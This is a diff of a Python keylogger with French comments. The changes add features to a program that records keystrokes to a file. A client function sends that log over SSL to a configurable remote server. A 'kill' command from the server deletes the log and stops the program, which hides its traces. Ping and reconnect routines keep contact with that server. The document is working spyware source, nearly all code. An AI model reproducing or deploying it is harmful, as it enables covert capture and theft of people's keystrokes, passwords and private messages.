@@ -1,4 +1,4 @@
-import platform, os, ctypes, socket, ssl
+import platform, os, ctypes, socket, ssl, time, ping3
 
 # Fonction création simple du fichier
 def creation_fichier(nom_fichier, sys):
@@ -21,6 +21,14 @@ def creation_fichier(nom_fichier, sys):
             print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))
     else:
         pass
+
+# Fonction suppression du fichier
+def suppression_fichier(file_path):
+    try:
+        # Supprimer le fichier
+        os.remove(file_path)
+    except Exception as e:
+        print(f"Erreur lors de la suppression du fichier : {e}")
 
 # Fonction pour écrire les frappes dans le fichier
 def touche_fichier(file_path, event):
@@ -57,11 +65,11 @@ def detect_os():
         return "Windows"
     else :
         return "Other"
-    
+
 # Fonction de client
-def client(file_path):
+def client(file_path, ip_server, port):
     # Paramètres du serveur
-    server_address = ("192.168.1.66", 8080)
+    server_address = (ip_server, port)
 
     # Création du socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -72,6 +80,11 @@ def client(file_path):
     try :
         # Connecter ssl
         client_ssl.connect(server_address)
+
+        # Arrêter le programme et supprimer le fichier si l'option -k est utilisée
+        command = client_ssl.recv(1024)
+        if command == "kill":
+            kill(file_path)
 
         # Ouvrir le fichier en mode lecture binaire
         with open(file_path, "rb") as f:
@@ -87,3 +100,46 @@ def client(file_path):
         client_ssl.close()
     except Exception as e:
         print(f"Erreur lors de l'envoi du fichier : {e}")
+
+# La fonction de ping du serveur
+def ping(ip_server):
+    while True:
+        if ping3.ping(ip_server) == None:
+            time.sleep(10)
+            if ping3.ping(ip_server) == None:
+                print("Le serveur n'est pas joignable, arrêt du programme")
+                exit()
+        else:
+            time.sleep(10)
+
+# Fonction si réception de la commande kill
+def kill(file_path):
+    # Arrêter le programme et supprimer le fichier
+    os.remove(file_path)
+    print("Le programme a été arrêté et le fichier supprimé !")
+    exit()
+
+# Fonction de connexion au serveur
+def connexion(ip_server, port, resultat):
+    # Paramètres du serveur
+    server_address = (ip_server, port)
+
+    # Création du socket
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Création du socket SSL
+    client_ssl = ssl.wrap_socket(client_socket,ca_certs="certificat.pem")
+
+    # Essayer de se connecter au serveur. S'il est toujours injoignable au bout de 10 minutes, le programme s'arrête
+    try:
+        # Connexion ssl
+        client_ssl.connect(server_address)
+    except Exception as e:
+        print(f"Erreur lors de la connexion au serveur : {e}")
+        time.sleep(10)
+        try : 
+            client_ssl.connect(server_address)
+        except Exception as e:
+            print("Le serveur n'est pas joignable, arrêt du programme")
+            # retourner resultat
+            resultat.put("exit")
